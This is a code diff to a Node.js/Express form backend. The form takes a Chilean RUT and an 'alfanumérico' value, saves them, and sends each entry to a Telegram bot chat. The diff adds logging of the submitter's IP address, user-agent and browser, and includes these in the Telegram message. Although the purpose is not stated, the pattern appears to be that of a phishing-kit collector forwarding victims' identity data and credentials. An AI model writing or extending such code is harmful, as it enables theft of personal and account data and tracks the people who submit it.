@@ -28,9 +28,45 @@ db.run(`
     id INTEGER PRIMARY KEY AUTOINCREMENT,
     numero TEXT NOT NULL,
     alfanumerico TEXT NOT NULL,
+    user_agent TEXT,
+    ip_address TEXT,
+    navegador TEXT,
     fecha_creacion DATETIME DEFAULT CURRENT_TIMESTAMP
   )
 `);
+
+function obtenerIP(req) {
+  const forwarded = req.headers['x-forwarded-for'];
+  if (typeof forwarded === 'string') {
+    return forwarded.split(',')[0].trim();
+  }
+
+  if (Array.isArray(forwarded)) {
+    return forwarded[0]?.trim() || 'unknown';
+  }
+
+  return (
+    req.headers['x-real-ip'] ||
+    req.headers['cf-connecting-ip'] ||
+    req.socket?.remoteAddress ||
+    'unknown'
+  );
+}
+
+function detectarNavegador(userAgent) {
+  if (!userAgent) return 'Desconocido';
+
+  const ua = userAgent.toLowerCase();
+
+  if (ua.includes('edg')) return 'Microsoft Edge';
+  if (ua.includes('opr') || ua.includes('opera')) return 'Opera';
+  if (ua.includes('chrome') && !ua.includes('edg')) return 'Google Chrome';
+  if (ua.includes('firefox')) return 'Mozilla Firefox';
+  if (ua.includes('safari') && !ua.includes('chrome')) return 'Safari';
+  if (ua.includes('trident') || ua.includes('msie')) return 'Internet Explorer';
+
+  return 'Otro navegador';
+}
 
 function validarRut(rut) {
   const clean = String(rut || '')
@@ -57,13 +93,13 @@ function validarRut(rut) {
   return dv === dvEsperado;
 }
 
-async function enviarNotificacionTelegram({ numero, alfanumerico, id }) {
+async function enviarNotificacionTelegram({ numero, alfanumerico, id, ip, navegador, userAgent }) {
   if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
     console.warn('Telegram no configurado. Se omite la notificación.');
     return;
   }
 
-  const texto = `📥 Nuevo ingreso\n🆔 Registro: ${id}\n🔢 RUT: ${numero}\n🔤 Alfanumérico: ${alfanumerico}`;
+  const texto = `📥 Nuevo ingreso\n🆔 Registro: ${id}\n🔢 RUT: ${numero}\n🔤 Alfanumérico: ${alfanumerico}\n🌐 Navegador: ${navegador}\n📍 IP: ${ip}\n🧭 User-Agent: ${userAgent || 'No disponible'}`;
 
   const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
     method: 'POST',
@@ -95,6 +131,9 @@ app.get('/health', (req, res) => {
 app.post('/guardar', async (req, res) => {
   const numero = String(req.body.numero || '').trim();
   const alfanumerico = String(req.body.alfanumerico || '').trim();
+  const userAgent = req.headers['user-agent'] || 'No disponible';
+  const ipAddress = obtenerIP(req);
+  const navegador = detectarNavegador(userAgent);
 
   if (!validarRut(numero)) {
     return res.status(400).json({ error: 'El RUT ingresado no es válido' });
@@ -104,9 +143,9 @@ app.post('/guardar', async (req, res) => {
     return res.status(400).json({ error: 'El campo alfanumérico no puede estar vacío' });
   }
 
-  const sql = 'INSERT INTO ingresos (numero, alfanumerico) VALUES (?, ?)';
+  const sql = 'INSERT INTO ingresos (numero, alfanumerico, user_agent, ip_address, navegador) VALUES (?, ?, ?, ?, ?)';
 
-  db.run(sql, [numero, alfanumerico], async function (err) {
+  db.run(sql, [numero, alfanumerico, userAgent, ipAddress, navegador], async function (err) {
     if (err) {
       console.error('Error al guardar:', err.message);
       return res.status(500).json({ error: 'Error al guardar en la base de datos' });
@@ -115,7 +154,14 @@ app.post('/guardar', async (req, res) => {
     const registroId = this.lastID;
 
     try {
-      await enviarNotificacionTelegram({ numero, alfanumerico, id: registroId });
+      await enviarNotificacionTelegram({
+        numero,
+        alfanumerico,
+        id: registroId,
+        ip: ipAddress,
+        navegador,
+        userAgent
+      });
     } catch (telegramError) {
       console.error('Error al notificar Telegram:', telegramError.message);
     }
